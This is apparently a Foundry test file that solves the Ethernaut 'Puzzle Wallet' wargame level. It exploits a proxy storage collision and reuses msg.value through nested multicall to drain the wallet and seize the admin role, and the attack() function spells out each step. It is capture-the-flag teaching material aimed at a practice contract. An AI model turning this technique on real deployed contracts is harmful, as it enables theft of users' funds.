// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "ethernaut/levels/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet target;
    PuzzleProxy proxy;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 5 ether);

        // deploy Puzzle Wallet logic
        PuzzleWallet logic = new PuzzleWallet();

        // deploy proxy and initialize implementation contract
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
        proxy = new PuzzleProxy(address(this), address(logic), data);
        target = PuzzleWallet(address(proxy));

        // whitelist this contract to allow it to deposit ETH
        target.addToWhitelist(address(this));
        target.deposit{value: 1 ether}();
    }

    /**
     * Take a look at how rekt the storage collision is:
     *
     * | slot | proxy          | logic               |
     * | ---- | -------------- | ------------------- |
     * | 0    | `pendingAdmin` | `owner`             |
     * | 1    | `admin`        | `maxBalance`        |
     * | 2    |                | `whitelisted` (map) |
     * | 3    |                | `balances` (map)    |
     */
    function attack() private {
        // become owner (thanks to storage collision)
        PuzzleProxy(payable(address(target))).proposeNewAdmin(player);
        require(target.owner() == player, "should become owner");

        // whitelist ourselves for the multicall in the next step
        target.addToWhitelist(player);

        // prepare the calldata
        //
        // although dynamic arrays are only available in storage, and we
        // need to pass a dynamic array as arguent to `multicall`, we can create
        // a dynamic array with known length via `new bytes[](N)` and populate it
        // to be the argument!
        bytes[] memory __depositData = new bytes[](1);
        __depositData[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory __multicallData = new bytes[](2);
        __multicallData[0] = abi.encodeWithSignature("deposit()");
        __multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", __depositData);

        // call multicall with the prepared data, causing deposit twice
        // value must be the contract balance
        uint256 bal = address(target).balance;
        target.multicall{value: bal}(__multicallData);

        // withdraw funds, with double the balance now
        target.execute(player, 2 * bal, "");

        // now that contract is drained, we can set max balance!
        // set max balance makes you the admin (thanks to storage collision)
        target.setMaxBalance(uint256(uint160(player)));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(proxy.admin(), address(player), "admin should be the player");
    }
}
